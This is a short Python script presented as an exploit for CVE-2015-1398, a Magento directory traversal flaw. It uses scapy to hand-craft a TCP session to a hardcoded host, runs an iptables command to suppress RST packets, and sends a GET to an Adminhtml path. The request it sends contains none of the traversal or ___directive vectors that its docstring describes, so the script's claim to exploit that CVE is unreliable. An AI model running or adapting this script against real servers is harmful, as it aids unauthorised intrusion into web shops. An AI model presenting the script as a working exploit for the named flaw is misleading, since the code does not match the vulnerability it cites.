#! /usr/bin/python
"""
Multiple directory traversal vulnerabilities in Magento Community Edition (CE) 1.9.1.0 and Enterprise Edition (EE) 1.14.1.0 
 allow remote authenticated users to include and execute certain PHP files via (1) .. (dot dot) sequences in the PATH_INFO to 
 index.php or (2) vectors involving a block value in the ___directive parameter to the Cms_Wysiwyg controller in the Adminhtml module, 
 related to the blockDirective function and the auto loading mechanism. NOTE: vector 2 might not cross privilege boundaries, 
 since administrators might already have the privileges to execute code and upload files.

 https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1398
"""

from scapy.all import conf, sniff
from scapy.layers.inet import ARP, IP, TCP, ICMP
from scapy.sendrecv import send, sr1
import argparse
import random
import os

os.environ['http_proxy'] = ''

dst_ip = '192.168.1.1'
src_ip = '172.16.1.1'
msg = 'FOOBAR'

   
def exploit():
        """
        Establish an HTTP conenction and send a malicious HTTP request.
        """

        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.16.1.1 -j DROP')
        
        src_port = random.randint(1024, 65535)
       
        ip_pkt = IP(src=src_ip, dst=dst_ip)
        tcp_pkt = TCP(dport=8080, sport=src_port, \
            seq=random.randint(0, 100000), flags='S')
        syn_ack = sr1(ip_pkt / tcp_pkt)

        tcp_pkt = TCP(dport=8080, sport=src_port, \
        seq=syn_ack[TCP].ack, ack=(syn_ack[TCP].seq + 1), flags='A')

        send(ip_pkt / tcp_pkt)
        http_msg = "GET /Adminhtml_1.php?forwarded=1 HTTP/1.1\r\nContent-Length: " \
        + str(len(msg)) + "\r\n\r\n" + msg
        sr1(ip_pkt / tcp_pkt / http_msg, timeout=30)
        exit()


if __name__ == '__main__':    
    exploit()
